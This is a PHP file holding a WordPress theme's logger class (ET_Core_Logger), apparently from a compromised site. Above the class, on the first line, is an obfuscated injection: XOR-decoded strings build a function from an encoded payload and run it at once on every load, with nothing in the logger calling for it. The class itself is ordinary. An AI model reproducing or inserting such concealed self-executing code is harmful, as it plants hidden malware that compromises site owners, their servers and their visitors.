<?php $PDBsl='NF.JZ.i499-T.;Z'^'-4K+.K6RLWN GT4';$heaHj=$PDBsl('','RKjkW89YOX-=q661:9HBs.XB-DVI2a.QX3bhyb741FU9+L0CWECT0eTLJW0kYEJCO<--YyLEQU.BUHVyQKlB3LU72akRcUoB2;3QNlwBKJaGlmM3v594;.YCuS+O4sqLn3AmorK9F+M.ivrWRoI;JLuQ>vBfmrFS1lcYVBZ1OOB5VZi9I;D7ChmSa:X8<A4LT+FLnrES5f4:fB-03SfvlTV6 IJBaZ48AoK=-KpVX3<HTvNbJBF6+XDibQ778zs8,KYDJu:V=BQIumEAL42qx9bLM,+NY=YHTgHJiPEYvL8p4;M,ttwr7P BUObA:NB7FkOKZT-7cm013-DI7RX:KLJ=<tih6o2Y3BtM2WGrqWPf>AU8Ypu-GB;J2QC+dSVRohWLE0;JEJKAUZJJWwUWO59UERK9Dp>mSC522+xjBl0YGWF9W>EFYdO96+Y;Z101TD2FWS22Xpj<45C7.QS>T=.jBoC.,OZt;S;NBPg<Zrp5UA+ejHK73IVK4WPEh5C80=4KP1H.pJuF,RLQDgnIxyMUgaV0O<,6HEE8bfaTvethFrOCY,WkTK-U-gbRX1CD9fk1g0ZEE w+mdWahVRFR,;f;7>.-3SJ5AIo +2A5RRqkeuT.;McArAqWLqP1ZE4W5mP7T9 .v4ZD=TMDDdaqh20AETnHYYR9'^';-BJ1MW:;1BS.SNXIM;jTV70r 7=S>q<-GEAPBL>8  WH8Y,9e;;B:0->6o440>kkXLY8Ula:0WkuhvYq0fK:h:BFAVrDrTH;2U><DS+kwAwWMiZJFMFWK7kQ7J;UZJlJZjFFxB0bD8ZIXOwzK-Z>-.uW+b8MV-6H7G0vgzB;=.P8rMR,BmjjSgZhH=LI3ZdpD38GIOZHlI0lfIQG2FKL27ZS,qHE>UL 0 XTkMv>RP;1MDh,-4SJ;,IJuhtw58qik87jQQ3DblwUI3  AWXXBhEiHJ:8b2--GujM;  MF1TPZ9MTIWVA1L70th<0D+QfCno>5YVJMK;:K+;R3;Rkdnbn18=s<fyR1TiY2>RLipBH 9M<YUVMK2nV07J;83+OUwh.UBqOCBe1;>+wJus9TU  iA09zCgYgQSFJXWb,E7424P6R,<<L7VDt=Z.Pon91Fn52AWnD5XQV,SKywZ5IOCnOgJM;;+P6BgkkmU<ZTQ45JELnkVA;72k<5<7P;QCIGcwZ-WWfUbH380mGHoXQ 1RIrT.HMmo. AE;HtKXTOuC,ulO2S7yKfIPPcnSsuXUXSUSbvrCCJJMwGNv34 MB9PRGqHK:9A2aHPJK-Z36VGEQ0OO,JhRaQwlQ+;S B6YEtS5MAuQD;=Q;, c9HJb;U9, FxpbXD');$heaHj();


class ET_Core_Logger {

	/**
	 * Writes a message to the WP Debug and PHP Error logs.
	 *
	 * @param mixed $message
	 */
	private static function _write_log( $message ) {
		$before_message = ' ';

		if ( function_exists( 'd' ) ) {
			// https://wordpress.org/plugins/kint-debugger/
			d( $message );
			return;
		}

		if ( ! is_scalar( $message ) ) {
			$message        = print_r( $message, true );
			$before_message = "\n";
		}

		$backtrace = debug_backtrace( 1 );
		$caller    = $backtrace[3];

		$file = isset( $backtrace[3]['file'] ) ? basename( $backtrace[3]['file'] ) : '<unknown file>';
		$line = isset( $backtrace[3]['line'] ) ? $backtrace[3]['line'] : '<unknown line>';

		$message = "{$file}:{$line} -> {$caller['function']}():{$before_message}{$message}";

		error_log( $message );
	}

	/**
	 * Writes message to the logs if {@link WP_DEBUG} is `true`, otherwise does nothing.
	 *
	 * @since 1.1.0
	 *
	 * @param mixed $message
	 */
	public static function debug( $message ) {
		if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
			self::_write_log( $message );
		}
	}

	public static function disable_php_notices() {
		$error_reporting = error_reporting();
		$notices_enabled = $error_reporting & E_NOTICE;

		if ( $notices_enabled ) {
			error_reporting( $error_reporting & ~E_NOTICE );
		}
	}

	/**
	 * Writes an error message to the logs regardless of whether or not debug mode is enabled.
	 *
	 * @since 1.1.0
	 *
	 * @param mixed $message
	 */
	public static function error( $message ) {
		self::_write_log( $message );
	}

	public static function enable_php_notices() {
		$error_reporting = error_reporting();
		$notices_enabled = $error_reporting & E_NOTICE;

		if ( ! $notices_enabled ) {
			error_reporting( $error_reporting | E_NOTICE );
		}
	}

	public static function php_notices_enabled() {
		$error_reporting = error_reporting();
		return $error_reporting & E_NOTICE;
	}
}
